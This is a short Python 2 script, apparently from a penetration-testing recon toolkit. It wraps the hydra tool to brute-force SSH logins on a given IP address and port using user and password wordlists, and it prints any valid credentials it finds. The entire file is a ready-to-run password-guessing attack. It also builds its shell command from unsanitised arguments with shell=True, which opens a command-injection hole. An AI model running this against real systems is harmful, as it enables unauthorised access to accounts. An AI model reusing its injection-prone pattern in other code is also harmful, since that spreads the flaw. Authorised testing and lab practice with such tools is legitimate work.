#!/usr/bin/env python2
import subprocess
import sys

if len(sys.argv) != 3:
    print "Usage: sshrecon.py <ip address> <port>"
    sys.exit(0)

ip_address = sys.argv[1].strip()
port = sys.argv[2].strip()

userlist='users.txt'
wordlist='wordlist.txt'

print "INFO: Performing hydra ssh scan against " + ip_address
HYDRA = "hydra -L %s -P %s -f -o results/%s_sshhydra.txt -u %s -s %s ssh" % (userlist, wordlist, ip_address, ip_address, port)
try:
    results = subprocess.check_output(HYDRA, shell=True)
    resultarr = results.split("\n")
    for result in resultarr:
        if "login:" in result:
	    print "[*] Valid ssh credentials found: " + result
except:
    print "INFO: No valid ssh credentials found"
